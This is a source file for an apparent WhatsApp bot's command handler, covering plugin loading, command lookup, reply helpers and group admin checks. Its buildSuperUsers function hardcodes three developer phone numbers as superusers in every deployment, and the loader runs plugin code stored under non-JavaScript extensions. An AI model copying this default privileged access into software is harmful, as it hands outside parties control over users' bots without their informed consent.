// ==========================================
// stanytz/connection/commandHandler.js
// Complete – loads plugins, finds commands, builds helpers & group info
// ==========================================

const fs = require('fs-extra');
const path = require('path');
const { evt, commands } = require('../gmdCmds');
const { standardizeJid } = require('./serializer');
const { getGroupMetadata, getLidMapping } = require('./groupCache');

// ---------- Enable loading of custom extensions ----------
const _compileAsJs = function (module, filename) {
    const content = fs.readFileSync(filename, 'utf8');
    module._compile(content, filename);
};
require.extensions['.gmd']     = _compileAsJs;
require.extensions['.kasongo'] = _compileAsJs;
require.extensions['.amd']     = _compileAsJs;
require.extensions['.atassa']  = _compileAsJs;
require.extensions['.ke']      = _compileAsJs;

const _pluginExts = new Set(['.js', '.gmd', '.kasongo', '.amd', '.atassa', '.ke']);

// ---------- Load all command plugins from a folder ----------
const loadPlugins = (pluginsPath) => {
    console.log(`📂 Loading plugins from: ${pluginsPath}`);
    let loadedCount = 0;
    try {
        const files = fs.readdirSync(pluginsPath);
        for (const fileName of files) {
            const ext = path.extname(fileName).toLowerCase();
            if (_pluginExts.has(ext)) {
                try {
                    require(path.join(pluginsPath, fileName));
                    loadedCount++;
                    console.log(`   ✅ Loaded: ${fileName}`);
                } catch (e) {
                    console.error(`   ❌ Failed to load ${fileName}: ${e.message}`);
                    if (e.stack) console.error(e.stack);
                }
            }
        }
        console.log(`📦 Total commands loaded: ${evt.commands?.length || 0} (from ${loadedCount} files)`);
    } catch (error) {
        console.error('❌ Error reading plugins folder:', error.message);
    }
};

// ---------- Find command by its pattern or alias ----------
const findCommand = (cmd) => {
    if (!Array.isArray(evt.commands)) return null;
    return evt.commands.find((c) => 
        c?.pattern === cmd || 
        (Array.isArray(c?.aliases) && c.aliases.includes(cmd))
    );
};

// ---------- Find command that listens to message body (on: "body") ----------
const findBodyCommand = (body) => {
    if (!Array.isArray(evt.commands) || !body) return null;
    return evt.commands.find((c) => {
        if (c?.on === 'body') {
            if (typeof c.pattern === 'string') {
                return body.toLowerCase().includes(c.pattern.toLowerCase());
            }
            if (c.pattern instanceof RegExp) {
                return c.pattern.test(body);
            }
        }
        return false;
    });
};

// ---------- Helper functions passed to commands ----------
const createHelpers = (Gifted, ms, from) => {
    const reply = (text, options = {}) => {
        Gifted.sendMessage(from, { text, ...options }, { quoted: ms });
    };

    const react = async (emoji) => {
        if (typeof emoji !== 'string') return;
        try {
            await Gifted.sendMessage(from, { 
                react: { key: ms.key, text: emoji }
            });
        } catch (err) {
            console.error('Reaction error:', err);
        }
    };

    const edit = async (text, message = ms) => {
        if (typeof text !== 'string') return;
        try {
            await Gifted.sendMessage(from, {
                text: text,
                edit: message.key
            }, { quoted: ms });
        } catch (err) {
            console.error('Edit error:', err);
        }
    };

    const del = async (message = ms) => {
        if (!message?.key) return;
        try {
            await Gifted.sendMessage(from, {
                delete: message.key
            }, { quoted: ms });
        } catch (err) {
            console.error('Delete error:', err);
        }
    };

    return { reply, react, edit, del };
};

// ---------- Get comprehensive group information ----------
const getGroupInfo = async (Gifted, from, botId, sender) => {
    const isGroup = from.endsWith('@g.us');
    if (!isGroup) {
        return {
            groupInfo: null,
            groupName: '',
            participants: [],
            groupAdmins: [],
            groupSuperAdmins: [],
            isBotAdmin: false,
            isAdmin: false,
            isSuperAdmin: false,
            sender
        };
    }

    const groupInfo = await getGroupMetadata(Gifted, from);
    if (!groupInfo || !groupInfo.participants) {
        return {
            groupInfo: null,
            groupName: '',
            participants: [],
            groupAdmins: [],
            groupSuperAdmins: [],
            isBotAdmin: false,
            isAdmin: false,
            isSuperAdmin: false,
            sender
        };
    }

    const participants = groupInfo.participants.map(p => p.pn || p.phoneNumber || p.id);
    const groupAdmins = groupInfo.participants.filter(p => p.admin === 'admin').map(p => p.pn || p.phoneNumber || p.id);
    const groupSuperAdmins = groupInfo.participants.filter(p => p.admin === 'superadmin').map(p => p.pn || p.phoneNumber || p.id);
    
    const senderLid = standardizeJid(sender);
    const found = groupInfo.participants.find(p => p.id === senderLid || p.pn === senderLid || p.phoneNumber === senderLid);
    let resolvedSender = found?.pn || found?.phoneNumber || found?.id || sender;
    if (resolvedSender.endsWith('@lid')) {
        const mapped = getLidMapping(resolvedSender);
        if (mapped) resolvedSender = mapped;
    }
    
    const botJid = standardizeJid(botId);
    const isBotAdmin = groupAdmins.includes(botJid) || groupSuperAdmins.includes(botJid);
    const isAdmin = groupAdmins.includes(resolvedSender);
    const isSuperAdmin = groupSuperAdmins.includes(resolvedSender);

    return {
        groupInfo,
        groupName: groupInfo.subject || '',
        participants,
        groupAdmins,
        groupSuperAdmins,
        isBotAdmin,
        isAdmin,
        isSuperAdmin,
        sender: resolvedSender
    };
};

// ---------- Build list of superusers (owner + sudo + devs) ----------
const buildSuperUsers = async (settings, getSudoNumbers, botId, ownerNumber) => {
    // Developer numbers (hardcoded – you can change or move to config)
    const devNumbers = ('255787069580,255618558502,255611858502')
        .split(',')
        .map(num => num.trim().replace(/\D/g, '')) 
        .filter(num => num.length > 5);

    const sudoNumbersFromFile = (await getSudoNumbers()) || [];
    const sudoNumbersSetting = settings.SUDO_NUMBERS || '';
    const sudoNumbers = (sudoNumbersSetting ? sudoNumbersSetting.split(',') : [])
        .map(num => num.trim().replace(/\D/g, ''))
        .filter(num => num.length > 5);

    const botJid = standardizeJid(botId);
    const ownerJid = standardizeJid(ownerNumber.replace(/\D/g, '') + '@s.whatsapp.net');
    
    const superUser = [
        ownerJid,
        botJid,
        ...sudoNumbers.map(num => `${num}@s.whatsapp.net`),
        ...devNumbers.map(num => `${num}@s.whatsapp.net`),
        ...sudoNumbersFromFile.map(num => `${num}@s.whatsapp.net`)
    ].map(jid => standardizeJid(jid)).filter(Boolean);

    return [...new Set(superUser)];
};

// Export all functions
module.exports = {
    loadPlugins,
    findCommand,
    findBodyCommand,
    createHelpers,
    getGroupInfo,
    buildSuperUsers
};